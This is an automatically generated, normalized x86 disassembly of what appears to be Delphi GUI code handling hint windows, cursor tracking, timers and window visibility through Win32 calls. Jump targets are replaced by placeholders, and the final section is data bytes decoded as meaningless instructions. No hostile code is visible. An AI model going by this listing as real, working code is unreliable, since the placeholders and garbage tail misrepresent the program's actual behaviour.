push sub_469d1c
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_46a200
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_46aa4c
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469d23
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_469d2c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_469d84
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_46a200
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_46aa4c
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469d8b
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_469d9c
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_403154
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_449fc0
jmp r-xdata
sub_469dec
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_467398
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_45071c
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_467384
mov ebx eax
mov eax ebx
call sub_450a20
test al al
je r-xdata
mov eax ebx
call sub_45071c
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_469e50
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_4486cc
mov edi eax
call sub_446fc8
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_44afd4
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_44afd4
sub_469ec8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_469fd8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_469e50
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_467f00
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_446f84
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_46a088
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push sub_469f7f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_46a420
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_469dec
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_420898
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469fdf
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f74
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_469fe8
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_46737c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_467368
movzx edx di
xor ecx ecx
call sub_44afd4
inc esi
dec ebx
jne r-xdata
sub_46a024
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_469140
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_469140
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_469fe8
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_46a088
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_40435c
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_403fa4
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_443980
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_456750
xor eax eax
push ebp
push sub_46a10d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403350
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403154
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_46a11c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_46a178
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_46737c
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_46a11c
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_467368
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_46a11c
pop ecx
jmp r-xdata
mov eax ebx
call sub_450a20
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_45071c
push eax
call IsChild
test eax eax
jne r-xdata
sub_46a200
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_4057bc
call sub_42ae6c
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_46a228
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_46a26c
push sub_467f58
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_46a420
sub_46a294
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406b30
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_449938
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_4486cc
call sub_467f38
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_46a420
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406b30
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_449938
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_46a420
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_46a228
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_44afd4
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_46a6b8
jmp r-xdata
sub_46a3a4
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_46a26c
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_46a6b8
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_46a3dc
jmp r-xdata
sub_46a3dc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_450a20
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_45071c
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_45071c
push eax
call ShowWindow
sub_46a420
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_46a3dc
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_4680c0
mov eax ebx
call sub_46a26c
sub_46a458
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_46a59a
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_426234
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_407cac
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_46a56b
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_4262ec
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a572
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4026fc
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_46a448
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_46a448
mov [ ebp - 0x4 ] eax
sub_46a572
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_46a5ac
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_403154
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_40309c
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_46a60c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_46a6a6
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a6ad
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_404040
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_424e18
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40c28c
mov ebx eax
inc ebx
sub_46a6b8
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_4048bc
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_46aa3e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_46a420
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_46a228
jmp r-xdata
call sub_4608d4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46aa45
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_403f74
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404980
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_4486cc
call sub_467f38
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_46a458
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_4672fc
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_4497c0
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_449964
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_467f00
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_446f40
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_403fe8
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_44afd4
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_46a5ac
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_403350
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_449938
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_449938
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_449fc0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_46804c
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_46a60c
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_46a228
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_46a228
jmp r-xdata
sub_46aa4c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_403fa4
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_403fa4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_46aa88
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_44afd4
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_44afd4
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_456618
sub_46ab18
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_46ab40
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_46abe4
add [ eax ] eax
add [ eax ] al
push eax
push cs
dec eax
add [ eax + 0x64 ] bh
inc esp
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_46ac47
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ac4e
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_460680
mov eax sub_460900
call sub_417f58
mov eax [ rw-data ]
push eax
call CloseHandle
sub_46aea9
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ esi ] bl
inc ebp
dec ecx
push edx
popad
dec esp
outsb
dec ebp
popad
js r-xdata
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
adc eax 0x49644945
outsb
jbe r-xdata
imul ebp [ esi + 0x65 ] 0x676e654c
je r-xdata
inc ebp
dec ecx
push eax
jb r-xdata
insb
imul esp [ ebx + edx * 2 + 0x65 ] 0x63697672
popad
insd
mov eax eax
inc ebp
js r-xdata
mov eax eax
je r-xdata
dec esi
nop
and al 0xaf
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 4 ] ah
inc esi
add [ eax + eax ] cl
add [ eax ] al
xchg esp eax
lodsb [ esi ]
inc esi
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 4 ] cl
inc esi
add [ eax + eax ] cl
add [ eax ] al
mov al 0x46
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
adc eax 0x53644945
outsd
outsb
mov al 0xb0
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0046b0 ] dh
add [ eax ] al
add [ esp + ebp * 4 + 0x33840046 ] dl
inc eax
add [ eax - 0x6bffbfcd ] dl
xor eax [ eax ]
cwde
xor eax [ eax ]
push eax
mov al 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x50 ] dl
inc esi
arpl [ edi + 0x6c ] bp
push edx
jo r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
mov cl 0x46
add [ eax + eax ] cl
jae r-xdata
add [ eax + eax ] cl
add [ eax ] al
xchg esp eax
lodsb [ esi ]
inc esi
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
adc eax [ ebp + 0x49 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jns r-xdata
